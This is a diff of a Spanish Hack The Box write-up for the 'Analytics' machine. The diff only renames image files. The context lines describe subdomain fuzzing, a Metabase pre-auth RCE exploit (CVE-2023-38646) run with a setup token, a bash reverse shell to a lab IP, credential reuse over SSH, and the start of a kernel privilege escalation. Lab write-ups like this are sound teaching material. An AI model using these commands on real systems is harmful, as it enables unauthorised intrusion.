@@ -3,7 +3,7 @@ title: "Analytics - WriteUp"
 date: Fri Aug 16 2024 15:00:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, dirb, reverse-shell, cve, exploit, wfuzz, nginx, cve-2023-38646]
-image: /assets/img/htb-writeups/Pasted image 20231124124446.png
+image: /assets/img/htb-writeups/Pasted-image-20231124124446.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231124124446.png
   platform="HTB"
 %}
 
-![Analytics](/assets/img/htb-writeups/Pasted image 20231124124446.png)
+![Analytics](/assets/img/htb-writeups/Pasted-image-20231124124446.png)
 
 -----
 
@@ -41,21 +41,21 @@ Vemos un VHOST apuntando a "analytical.htb", actualizamos /etc/hosts y seguimos.
 
 WEB
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124124446.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124124446.png)
 
 Posibles usuarios y un correo electrónico.
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124125721.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124125721.png)
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124125807.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124125807.png)
 
 Si pulsamos sobre _Login_ intenta conectar con el subdominio _data_. Tendremos que agregarlo a nuestro archivo hosts.
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124130045.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124130045.png)
 
 Accedemos de nuevo y vemos la pantalla de login:
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124130247.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124130247.png)
 
 FUZZING
 
@@ -67,7 +67,7 @@ $ wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1mi
 
 Parece que solo existe "data".
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124133742.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124133742.png)
 
 Ahora toca hacer un fuzzing de subdirectorios, hemos escondido las páginas con 27 líneas de longitud porque está configurado para que devuelva estado 200 en todas las páginas:
 
@@ -75,7 +75,7 @@ Ahora toca hacer un fuzzing de subdirectorios, hemos escondido las páginas con 
 $ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 27  -t 100 http://data.analytical.htb/FUZZ
 ```
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124135838.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124135838.png)
 
 Vamos a buscar si existen vulnerabilidades en la API de _MetaBase_
 
@@ -85,17 +85,17 @@ Encontramos un exploit que se adapta a nuestro entorno.
 
 https://github.com/Pyr0sec/CVE-2023-38646/tree/main
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124142156.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124142156.png)
 
 El exploit es "Pre-Auth" y requiere de un token que no tenemos para que se lleve a cabo la explotación y conseguir una reverse shell.
 
 En la misma página del exploit nos da una referencia a otra web https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ y nos explica dónde obtener el token que necesitamos.
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124142559.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124142559.png)
 
 Vamos a la ruta que nos indica y buscamos el "setup token" que necesitamos.
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124142740.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124142740.png)
 
 Tenemos el token que nos hacía falta.
 
@@ -105,7 +105,7 @@ Lanzamos el exploit no sin antes ponernos en escucha con _netcat_ para recibir l
 $ python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.25/9001 0>&1"
 ```
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124144442.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124144442.png)
 
 Y pa dentro...
 
@@ -115,7 +115,7 @@ Vamos a enumerar para intentar salir del contenedor.
 
 Empezamos con _env_
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124152021.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124152021.png)
 
 Encontramos unas credenciales:
 
@@ -131,19 +131,19 @@ $ ssh metalytics@10.129.116.182
 Password: An4lytics_ds20223#
 ```
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124152602.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124152602.png)
 
 Perfecto, estamos en la máquina host!
 
 Registramos la primera bandera y enumeramos...
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124154858.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124154858.png)
 
 Vamos a buscar vulnerabilidades de kernel, por si las tuviera.
 
 Encontramos esta: https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/
 
-![ANALYTICS](/assets/img/htb-writeups/Pasted image 20231124155818.png)
+![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124155818.png)
 
 Creamos un archivo en /tmp y lo llamaremos _exploit.sh_ y dentro escribiremos lo siguiente:
 
